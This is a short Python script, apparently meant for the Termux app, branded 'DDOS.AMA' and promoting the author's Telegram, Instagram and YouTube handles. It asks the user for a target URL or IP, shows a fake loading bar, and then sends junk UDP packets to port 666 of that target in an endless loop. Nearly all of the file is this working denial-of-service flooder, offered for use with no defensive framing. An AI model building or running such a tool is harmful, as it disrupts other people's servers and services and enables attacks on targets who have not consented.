import time
import socket
import os
red='\033[31m'
green='\033[32m'
os.system("pkg install toilet -y ")
os.system("pkg install figlet -y ")
os.system("clear")
os.system("toilet -f mono12 -F metal DDOS.AMA")
print(f"{red} ➦==============ａｍａ．ｐｌａｙｅｒ００００===============➢")
print(" ↦AMA.PLAYER big and famous←• ")
print(" ↦My Telegram ID: @ama_player0000 ")
print(" ↦My Instagram ID: @ama_player0000 ")
print(" ↦My Youtube ID: @ama_player0000 ")
print(" ➥==============ａｍａ．ｐｌａｙｅｒ００００==============➣")
target = input(f"{green}Enter Target URL or IP : ")
target.replace("http://", "")
target.replace("https://","")
target.replace("www.","")
ip = socket.gethostbyname(target)
port = 666
joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhyggggh"
os.system("clear")
os.system("toilet -f mono12 gay Loading")
print("Loading{~~~ }5%")
time.sleep(3)
print("Loading{~~~~~~ }26%")
time.sleep(3)
print("Loading{~~~~~~~~~ }68%")
time.sleep(3)
print("Loading{~~~~~~~~~~~~ }87%")
time.sleep(3)
print("Loading{~~~~~~~~~~~~~~~~ }•→START←•")
time.sleep(3)
print("Loading{~ }100%")
os.system("clear")
os.system("figlet Attack_Starting")
while True:
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.sendto(bytes(joker,"UTF-8"), (ip,port))
     print(port,"<=== ! SEND WAR DDOS AMA ! ===>",ip)
